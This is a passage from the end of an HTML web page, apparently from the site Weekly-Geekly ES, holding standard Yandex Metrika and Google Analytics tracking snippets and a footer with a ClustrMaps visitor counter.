                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>